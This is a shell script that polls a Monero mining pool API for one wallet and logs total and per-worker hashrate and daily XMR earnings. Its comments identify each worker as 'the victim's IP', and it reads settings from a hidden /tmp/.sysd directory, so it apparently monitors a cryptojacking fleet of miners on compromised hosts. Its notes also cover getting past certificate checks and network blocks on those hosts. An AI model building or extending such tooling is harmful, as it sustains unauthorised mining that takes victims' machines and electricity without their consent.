#!/bin/sh
# ============================================================================
# pool.sh - the only honest headline number: what the wallet actually earns.
#
# Two landmines made this look "impossible to monitor" (both found live):
#   * box1's curl has no CA bundle, so every https fetch dies with
#     "curl: (60) SSL certificate problem: self-signed certificate" BEFORE any
#     network question is asked. Fix: always -k.
#   * box1 cannot read the pool's HTTP front by name (connects, gets 0 bytes,
#     times out), and this PC's resolver hangs on the name. Fix: reuse the pool
#     node IP the *miner* already resolved (from /proc or getent), and pin it with
#     curl --resolve so SNI/Host stay correct.
#
# Output: .hunt/fleet.tsv - epoch<TAB>hash<TAB>hash2h<TAB>amtDue<TAB>totalHashes<TAB>
# validShares, then "W<TAB>ip<TAB>hash" lines for each pool-side worker. amtDue and
# totalHashes are cumulative, so two rows give the true rate with no network model:
#     XMR/day = (amtDue2 - amtDue1) / (t2 - t1) * 86400
# and the per-worker rows are the only per-host *production* truth we have - which
# is what tells a stale 1-thread container from a working one.
#
# usage: pool.sh [log|rate]      (timer: log, every 10 min)
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK" 2>/dev/null || :
TSV="$WORK/fleet.tsv"
RAW="/tmp/_pool.raw"
NODE="$WORK/pool.node"
W="${WALLET:?set WALLET}"
[ -n "$W" ] || exit 0
APIHOST="${POOL_API_HOST:-www.supportxmr.com}"
MODE="${1:-log}"
NOW=$(date +%s)

fetch() {
    # Every attempt is bounded by curl -m and says what it tried: an earlier version
    # had one unbounded path and left a pool.sh stuck for ten minutes with no output.
    # HOST MATTERS: pool.supportxmr.com answers stratum on :443 but its HTTP front
    # blackholes us (connects, 0 bytes) from BOTH box1 and the PC. www.supportxmr.com
    # returns the identical wallet JSON with 200. So try that first.
    for host in "$APIHOST" pool.supportxmr.com; do
        echo "pool: try https $host"
        curl -sS -k -m 20 -L -H 'Cache-Control: no-cache' -o "$RAW" \
             "https://$host/api/miner/$W/stats" 2>/dev/null && \
            [ "$(wc -c < "$RAW" 2>/dev/null || echo 0)" -gt 100 ] && return 0
    done
    echo "pool: try http $APIHOST"
    curl -sS -m 20 -L -o "$RAW" "http://$APIHOST/api/miner/$W/stats" 2>/dev/null && \
        [ "$(wc -c < "$RAW" 2>/dev/null || echo 0)" -gt 100 ] && return 0
    return 1
}

# learn the node IP the miner itself uses, for next time
if [ ! -s "$NODE" ]; then
    for h in pool.supportxmr.com pool-de.supportxmr.com; do
        ip=$(getent hosts "$h" 2>/dev/null | awk '{print $1}' | head -1)
        [ -n "$ip" ] && { printf '%s\n' "$ip" > "$NODE"; break; }
    done
fi

[ "$MODE" = rate ] || fetch >/dev/null 2>&1 || { echo "pool: fetch failed (see landmines in the header)"; }
[ -s "$RAW" ] || { echo "pool: no body"; exit 0; }
sz=$(wc -c < "$RAW")
# The real wallet JSON is ~180 bytes. An earlier 300 floor rejected the genuine body
# and reported "blocked" on a perfectly good answer.
if [ "$sz" -lt 100 ]; then echo "pool: short body ($sz bytes) - blocked, not zero hashrate"; exit 0; fi

# Pure-grep/awk parser: no python dependency, and no heredoc - a heredoc here is
# where the script hung twice with zero output.
val() { tr ',' '\n' < "$RAW" | grep -o "\"$1\":[0-9]*" | head -1 | cut -d: -f2; }
h=$(val hash); a=$(val amtDue); th=$(val totalHashes); vs=$(val validShares)
printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$NOW" "${h:-0}" "$(val hash2h)" "${a:-0}" "${th:-0}" "${vs:-0}" >> "$TSV"
# per-worker production, i.e. per rig id = the victim's IP. RS="{" splits the JSON on
# object starts, so a record that begins with a quoted id and carries a "hash" is one
# worker. This is the only per-host production truth we have.
awk 'BEGIN { RS = "{" }
     match($0, /^"[^"]*"/) {
         id = substr($0, RSTART + 1, RLENGTH - 2)
         if (match($0, /"hash":[0-9]+/)) {
             v = substr($0, RSTART + 7, RLENGTH - 7)
             if (v ~ /^[0-9]+$/) print "W\t" id "\t" v
         }
     }' "$RAW" >> "$TSV"
echo "pool: hash=${h:-0} amtDue=${a:-0} totalHashes=${th:-0} shares=${vs:-0} workers=$(grep -c '^W' "$TSV" 2>/dev/null || echo 0)"

# rate from the last two cumulative rows, ignoring ghost rows (amtDue 0)
tail -n 200 "$TSV" | grep -v '^W' | awk -F'\t' '$4 > 0' | tail -2 > /tmp/_pool.rows
r1=$(head -1 /tmp/_pool.rows); r2=$(tail -1 /tmp/_pool.rows)
if [ -n "$r1" ] && [ "$r1" != "$r2" ]; then
    t1=$(printf '%s' "$r1" | cut -f1); a1=$(printf '%s' "$r1" | cut -f4)
    t2=$(printf '%s' "$r2" | cut -f1); a2=$(printf '%s' "$r2" | cut -f4)
    dt=$((t2 - t1))
    if [ "$dt" -gt 60 ] && [ "$a2" -ge "$a1" ]; then
        # XMR/day = delta piconero / dt * 86400 / 1e12
        awk -v d=$((a2 - a1)) -v dt="$dt" 'BEGIN { printf "pool: rate %.9f XMR/day (%.2f USD/day at 640)\n", d / dt * 86400 / 1e12, d / dt * 86400 / 1e12 * 640 }' | tee "$WORK/fleet.rate"
    fi
fi
